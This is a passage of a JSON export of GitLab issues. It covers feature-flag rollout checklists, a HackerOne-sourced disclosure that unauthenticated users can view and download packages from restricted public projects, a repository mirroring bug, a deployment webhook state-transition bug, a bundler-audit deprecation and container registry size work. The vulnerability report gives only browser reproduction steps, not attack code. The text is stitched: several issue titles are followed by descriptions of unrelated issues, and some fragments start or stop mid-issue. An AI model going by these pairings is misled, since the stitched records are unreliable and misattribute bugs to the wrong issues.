Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set sbom_survey false\n```","state":"closed","created_at":"2021-12-10T16:10:13.879Z","updated_at":"2022-03-03T06:32:35.698Z","closed_at":"2022-01-21T19:08:17.557Z","closed_by":{"id":5412787,"username":"nmccorrison","name":"Neil McCorrison","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5412787/avatar.png","web_url":"https://gitlab.com/nmccorrison"},"labels":["feature flag","feature::addition","type::feature","workflow::in dev"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"}],"author":{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"},"type":"ISSUE","assignee":{"id":7293390,"username":"jannik_lehmann","name":"Jannik Lehmann","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7293390/avatar.png","web_url":"https://gitlab.com/jannik_lehmann"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348181","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":9},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"9 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348181","notes":"https://gitlab.com/api/v4/projects/278964/issues/348181/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348181/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348181","relative":"#348181","full":"gitlab-org/gitlab#348181"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98819375,"iid":348159,"project_id":278964,"title":"Submit button is disabled for users different than 1","description":"After this MR (gitlab-org/gitlab!76112) the Submit button is not disabling unless the number of users is `1`.

The list of packages are visible (and also downloadable now) to any unauthenticated users even when public project has repositories restricted only to team members. \n\n#####  Steps to reproduce\n\n1. Create a public group and public project underneath.  \n2. Go to project settings and set `Repositories` to be limited only to team members.\n\n![Screen_Shot_2021-12-08_at_2.01.10_PM.png](https://h1.sec.gitlab.net/a/c86c4464-78fa-4065-ae42-f20085d07a33/Screen_Shot_2021-12-08_at_2.01.10_PM.png)\n\n3. Since `Packages` are part of repositories, they shouldn't be visible to users without access to group or project.  \n4. Now browse the url unauthenticated `https://gitlab.com/\u003cGroupName\u003e/\u003cProjectName\u003e/-/packages` and you will see the packages as well as you can download the files (which was not possible during #635502).  \n5. The permissions are correctly enforced at group level though. You CAN NOT see packages at group level `https://gitlab.com/groups/\u003cGroupName\u003e/-/packages`.\n\n\n\n#####  Examples\n\nYou can browse my url unauthenticated `https://gitlab.com/g3220/githubimport/-/packages` and you will see list of packages and download the files inside it. \n\nRepositories for that projects are restricted only to team members.\n\nPermissions correctly enforced at group level `https://gitlab.com/groups/g3220/-/packages`\n\n#####  What is the current *bug* behavior?\n\nUnauthenticated user can see and download packages of public projects whose repositories are restricted .\n\n#####  What is the expected *correct* behavior?\n\nWhen repositories are restricted, users without access to project shouldn't see packages l.\n\n\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\nRegards,  \nAshish\n\n####  Impact\n\nUnauthenticated users can see and download packages from public projects whose repositories are restricted\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [Screen_Shot_2021-12-08_at_2.01.10_PM.png](https://h1.sec.gitlab.net/a/c86c4464-78fa-4065-ae42-f20085d07a33/Screen_Shot_2021-12-08_at_2.01.10_PM.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2021-12-10T07:41:25.443Z","updated_at":"2022-05-10T09:07:30.252Z","closed_at":"2022-03-24T18:17:57.884Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Package Registry","Deliverable","HackerOne","Package:P1","Weakness::CWE-284","backend","bug::vulnerability","devops::package","group::package registry","priority::3","ruby","section::ops","security","severity::3","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"user_notes_count":43,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-02-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/348138","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/348138","notes":"https://gitlab.com/api/v4/projects/278964/issues/348138/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/348138/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#348138","relative":"#348138","full":"gitlab-org/gitlab#348138"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98785053,"iid":348110,"project_id":278964,"title":"Permission error banner is not specific enough when running Pipeline","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\n### Steps to reproduce\n\n1. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/73422/pipelines\n1.

I have a private GitHub repository: https://github.com/robotmay/blorp.git\n1. I want to run the CI/CD step only on GitLab\n1. I use the external repo flow: https://gitlab.com/projects/new#cicd_for_external_repo\n1. I use the URL `https://robotmay@github.com/robotmay/blorp.git` for the repository, and a Personal Access Token in the password field\n1. I click create, and the repository is successfully fetched, but:\n    - The next attempt to mirror it will fail\n    - I go to https://gitlab.com/robotmay/blorp/-/settings/repository and expand `Mirroring Repositories`\n    - The repository URL is now missing the username component\n\n### Workaround\n\nIf you get to this point, you can fix the mirror by removing it and re-configuring it through the `Mirroring Repositories` settings, following the same setup as before.

Maybe we can have a CI job that can run a check only if we have changed for database metrics and see a diff before after.\n\nThere are a bunch of problems to resolve there:\n- Queries will have different timestamps between runs, because they are usually constructed using Active Record. In RSpec freezing the timestamps was easy using `timecop`, but outside of Rails this might be non-trivial. Stubbing timestamps in the actual class / API endpoint might be a solution, but we need to ask Data team if they the rely on those timestamps in any way.\n- The diff must be made between the SQL queries in MR branch and the target branch.

Phase one of the rollout is just to ensure we're happy with it's usage.\n\nOvertime and once the feature impact has been reviewed with those customers, the business/product can decide if we're to proceed with a full rollout or not.\n\nSome additional detail about this can be found here: https://gitlab.com/gitlab-org/gitlab/-/issues/336251#note_692902589\n\n## Owners\n\n- Team: Fulfillment Utilization\n- Most appropriate slack channel to reach out to: `#g_utilization`\n- Best individual to reach out to: @ebaque \n- PM: @amandarueda \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## The Rollout Plan\n\n- Partial Rollout on GitLab.com with testing groups\n\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant?

'skipped -\u003e created' state transitions in deployment jobs","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nDisallowing a `skipped` to `created` state transition on `Deployment` objects causes it to miss sending a deployment `running` state web-hook notification.\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n1. Setup a webhook receiver URL. I used https://webhook.site/ as an example.\n2. Create a project with CI enabled and configure it to use the webhook under Project \u003e Settings \u003e Webhooks\n3. Configure the webhook to only send `Deployment events`\n4. Add the following as the pipeline configuration for the project via CI/CD \u003e Editor\n\n```\nimage: bash:latest\n\nbuild:\n  stage: build\n  when: manual\n  script: echo\n\ndeploy:\n  stage: deploy\n  environment: production\n  needs:\n    - build\n  script: echo\n```\n\n5. Run the pipeline, and check the webhook URL for received events\n6. The following bug is observed:\n  - Expectation: Two deployment events are received: deployment `running` and `success` states\n  - Observed: Only a single deployment event is received: deployment `success` state\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\nThis can be tested on any CI/CD enabled project.\nAn example is difficult to provide as it requires measuring from an external receiver (webhook URL).\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nDeployment `running` webhook events are not sent for affected jobs\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nDeployment `running` webhook events are sent for all deployment jobs\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\nSee customer support ticket: https://gitlab.zendesk.com/agent/tickets/254907 (internal link) or the instructions to use webhooks above.\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\nThis bug happens on GitLab.com\n\n### Possible fixes\n\n#### Notes from implementation review\n\nWhen the pipeline's created, the `test` job starts with an initial state of `created`, and so does its associated deployment.\n\nThe `test` job is then initially moved to `skipped` because it depends on a manual action of `build` job. This causes the Deployment object's state too to go from `created` (initial) to `skipped`.\n\nHowever, when the `build` job is played, the `test` job's state updates from `skipped` to `created` instantly.\n\nThis action gets deemed illegal by the deployment state sync because there's an assumption that `created` is not a state that can ever recur. We do not handle receiving a `created` state from the job: https://gitlab.com/gitlab-org/gitlab/blob/989928ec3dd95afd52db9f26d3a9d9210fbf2b69/app/models/deployment.rb#L378-393 so if it ever came in the result would be an error of `The status created is invalid` and the state of the deployment job will remain `skipped`.\n\nThe pipeline moves on though despite the above (because its not a fatal exception, its logged and control is returned) and when the `test` job moves to `running` the deployment equally fails to move to `running` now because the deployment state machine does not accept a `skipped` to `running` movement, registering an error:\n\n```\n\"exception.class\": \"Deployment::StatusSyncError\"\n\"exception.message\": \"Cannot transition status via :run from :skipped (Reason(s): Status cannot transition via \\\"run\\\")\"\n```\n\nThe MR https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72746 hid the logs `The status created is invalid` from being logged as it was decided in its discussion that the deployment's state must never need to go 'backwards' to `created` and that whatever was attempting it was a bug, but the way the job transitions occur for `needs` + `when:manual` jobs appears to suggest this is a possible and normal state flow. The issue of https://gitlab.com/gitlab-org/gitlab/-/issues/341561 further causes skipped states to occur for jobs after they have been created.\n\n#### Fix suggestion\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e\n\n1. The handling at https://gitlab.com/gitlab-org/gitlab/blob/989928ec3dd95afd52db9f26d3a9d9210fbf2b69/app/models/deployment.rb#L378-393 should include accepting `created` events from the job state\n2. The event state machine should include a valid transition to `:created` from `:skipped`: https://gitlab.com/gitlab-org/gitlab/blob/989928ec3dd95afd52db9f26d3a9d9210fbf2b69/app/models/deployment.rb#L62-81\n\n/cc @mlockhart

For example, if a deprecation is announced in 14.9 and scheduled to be completed in 15.0, the same content would be included in the documentation for 14.9, 14.10, and 15.0.\n--\u003e\n\nDependency Scanning uses [bundler-audit](https://gitlab.com/gitlab-org/security-products/analyzers/bundler-audit) and [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium) for analyzing ruby projects. `bundler-audit` was added because it has a different advisory source from `gemnasium`: [ruby-advisory-db](https://github.com/rubysec/ruby-advisory-db). However, the gemnasium advisory database [gemnasium-db](https://gitlab.com/gitlab-org/security-products/gemnasium-db) is now a [superset](https://gitlab.com/gitlab-org/gitlab/-/issues/288322) of `ruby-advisory-db`. This has made `bundler-audit` redundant.\n\nThis change will only affect users that are using the analyzer directly either through changing the CI configuration for Dependency Scanning to use `bundler-audit` directly or by using the `bundler-audit` docker image in a job.\n\n### Breaking Changes\n\n- Dependency Scanning job `bundler-audit-dependency_scanning` will no longer be available: https://gitlab.com/gitlab-org/gitlab/blob/14-5-stable-ee/lib/gitlab/ci/templates/Security/Dependency-Scanning.gitlab-ci.yml#L127\n- `bundler-audit` container registry and containers (e.g. `registry.gitlab.com/gitlab-org/security-products/analyzers/bundler-audit:$TAG`) will no longer be available\n\n### Affected Topology\n\n\u003c!--\nWho is affected by this deprecation, Self-managed users, SaaS users, or both? This is especially important when nearing the annual major release where breaking changes and removals are typically introduced. These changes might be seen on GitLab.com before the official release date.\n--\u003e\n\nBoth self-managed and saas users will be affected.\n\n### Affected Tier\n\n* Ultimate\n\n### Checklist\n\n- [ ] @mention your stage's stable counterparts on this issue. For example, Customer Support, Customer Success (Technical Account Manager), Product Marketing Manager.\n  - To see who the stable counterparts are for a product team visit [product categories](https://about.gitlab.com/handbook/product/categories/)\n       - If there is no stable counterpart listed for Sales/CS please mention `@timtams`\n       - If there is no stable counterpart listed for Support please @mention `@gitlab-com/support/managers`\n       - If there is no stable counterpart listed for Marketing please mention `@williamchia`\n\n### Deprecation Milestone\n\n\u003c!-- In which milestone will this deprecation be announced ? --\u003e\n\n14.6\n\n### Planned Removal  Milestone\n\n15.0\n\n### Implementation Plan\n\n- [x] update GitLab project (https://gitlab.com/gitlab-org/gitlab/-/merge_requests/86704)\n  -

As a result, these artifacts will be put on queue for removal by `ExpireBuildArtifactsWorker`.\n\n## Owners\n\n- Team: ~\"group::testing\"\n- Most appropriate slack channel to reach out to: `#g_testing`\n- Best individual to reach out to: @alberts-gitlab (or @drew)\n- PM: Jackie Porter @jreporter \n\n## Stakeholders\n\nAre there any other stages or teams involved that need to be kept in the loop?\n- @jreporter  (PM)\n- @shampton (FCL https://gitlab.com/gitlab-org/ci-cd/testing-group/-/issues/82)\n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen this feature is enabled, the API `DELETE /projects/:id/artifacts` would be available to project maintainers. Project maintainers can call this API to remove all existing erasable job artifacts from non-locked pipelines.\n\nSome keywords here are:\n- erasable job artifacts - all job artifacts except `trace`\n- non-locked pipelines - pipelines that are not the latest pipeline of each ref.\n\nWhen the API is called, we would expect the number of artifacts that will be picked up by `ExpireBuildArtifactsWorker` to increase.\n\n### When is the feature viable?\n\n`ExpireBuildArtifactsWorker` needs to be running in order for the artifact deletion to complete. This worker is currently turned off following the incident https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5952.\n\n`ExpireBuildArtifactsWorker` has been re-enabled (see https://gitlab.com/groups/gitlab-org/-/epics/7311#first-set-of-feature-flags-3).\n\n### What might happen if this goes wrong?\n\n* Performance degradation when processing `ExpireBuildArtifactsWorker`\n\nWe should turn off the feature flag if we see these issues.\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects\n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set bulk_expire_project_artifacts true --dev`\n    - [x] `/chatops run feature set bulk_expire_project_artifacts true --staging`\n- [x] Verify that the feature works as expected.

UUID","description":"This issue came from this discussion: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75821#note_752958083.\n\nWorkers with [parameter hash](https://docs.gitlab.com/ee/development/sidekiq/compatibility_across_updates.html#parameter-hash) args make it much easier to [add new arguments](https://docs.gitlab.com/ee/development/sidekiq_style_guide.html#add-an-argument) to workers.\n\nWe would like to migrate the new webhook detection data being passed through to the worker in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75821 through the existing `data` payload to be migrated to being passed through the new `params` hash instead. \n\nWe will follow a [multi-step deployment](https://docs.gitlab.com/ee/development/sidekiq/compatibility_across_updates.html#multi-step-deployment):\n\n- [x] `Release 14.7`: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75821 is adding a `params = {}` argument to `WebHookWorker`.\n- [x] `Release M+1`: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/79173 Pass the webhook recursion detection data through in `params`, but the worker should continue to expect the data to come through either `data` or `params`.\n- [x] `Release M+2`: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81772 Remove the handling of the recursion detection data in `data`.\n\nNote a separate issue https://gitlab.com/gitlab-org/gitlab/-/issues/351272 captures the migration of more arguments to the `params` arg.\n\n### Availability \u0026 Testing\n\n* `specs/workers/webhook_worker_spec.rb` might be updated to reflect the updated api\n* The recursion detection MR included tests in the unit layer :100:, which should continue to pass or might be updated to reflect the updated api\n* @sgregory2 can also add a feature level test for recursion detection as well, if we feel that we are missing functional coverage\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart

Among others, this database will allow for efficient storage usage calculations.\n\nThis issue is part of a work plan to expose the deduplicated size of **grouped** image repositories in the GitLab UI and API (https://gitlab.com/groups/gitlab-org/-/epics/7228).\n\nWhat is the deduplicated size of grouped image repositories? Say we have a `my-group/my-project` container repository. Project level container repositories can have up to three sub-levels of container repositories. For example, let's consider we have `my-group/my-project/foo` and `my-group/my-project/bar` as well. In this case, if we want to know the deduplicated size of all repositories under a given project, we have to query the container registry for the deduplicated size of `my-group/my-project` and its descendants (if any).\n\nThe Container Registry has a new API under the `/gitlab/v1/` prefix, documented [here](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md). This API includes a [Get repository details](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details) operation which allows retrieving details about image repositories, including their deduplicated size. To make this possible, the `size` query parameter of this operation must be set to `self_with_descendants` instead of `self`.\n\n## Proposal\n\nOnce the Container Registry API is updated to allow querying the size of grouped repositories (https://gitlab.com/gitlab-org/container-registry/-/issues/519), we should:\n\n1. Add support for obtaining the size of grouped image repositories to the Rails container registry client class, using the [get repository details](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details) operation of the new Container Registry API. https://gitlab.com/gitlab-org/gitlab/-/issues/353555 must be done first.\n\n   By the time we start working on this, support for this registry operation and the `size` parameter was already added as part of https://gitlab.com/gitlab-org/gitlab/-/issues/347349. Therefore, in this issue, all we'll have to do is add support for the `self_with_descendants` option of the `size` query parameter.\n\n1. Expose the size of grouped image repositories in the response of the GitLab API [Get details of a single repository](https://docs.gitlab.com/ee/api/container_registry.html#get-details-of-a-single-repository) operation.\n\n   For the time being, this will require making an HTTP request against the new Container Registry API for each image repository. Therefore, we should start small and only add support for this to the [Get details of a single repository](https://docs.gitlab.com/ee/api/container_registry.html#get-details-of-a-single-repository) operation, leaving the [List registry repositories](https://docs.gitlab.com/ee/api/container_registry.html#list-registry-repositories) operation for later. Additionally, we should guard this new behavior behind an optional query parameter `descendants` (boolean), which should be paired with `size`:\n\n   ```shell\n   curl --header \"PRIVATE-TOKEN: \u003cyour_access_token\u003e\" \\\n     \"https://gitlab.example.com/api/v4/registry/repositories/2?size=true\u0026descendants=true\"\n   ```\n\n   We should then fill the `size` response attribute with the size returned from the registry (in `size_bytes`).\n\n### Important Notes\n\n- Please note that for now, this operation will only be available for GitLab.com and for image repositories created on (or imported into) the new container registry platform backed by the metadata database. The Container Registry API will reply with a `404 Not Found` in case the **base** repository does not exist on the new platform. To avoid making unnecessary HTTP requests just to find out that the information is not available, in Rails we should restrict this operation to be used only when `Gitlab.com?` is `true` and the **base** container repository was created after `ContainerRepository::MIGRATION_PHASE_1_ENDED_AT` (which should be set to `2022-01-22`).\n\n- When querying for the aggregated size of `my-group/my-project` (base repository), it's possible that `my-group/my-project/foo` is on the new platform but `my-group/my-project/bar` is not. In this case, the returned size will be incomplete. There are two ways we can proceed in regards to this:\n\n     1. Restrict this operation to base repositories whose sub repositories were all created after `ContainerRepository::MIGRATION_PHASE_1_ENDED_AT`. This guarantees that the returned size is accurate and complete, as all repositories live in the new platform;\n     1. Expand the evaluation conditions to take into account the migration status of repositories created before `ContainerRepository::MIGRATION_PHASE_1_ENDED_AT`.","state":"closed","created_at":"2021-12-07T18:11:23.392Z","updated_at":"2022-04-18T07:02:25.898Z","closed_at":"2022-04-12T21:20:47.499Z","closed_by":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"labels":["Category:Container Registry","Deliverable","Package:P1","UX","auto updated","backend","devops::package","feature::addition","group::package registry","package:active","ruby","section::ops","type::feature","workflow::in dev"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":5054840,"username":"jdrpereira","name":"João Pereira","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054840/avatar.png","web_url":"https://gitlab.com/jdrpereira"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David 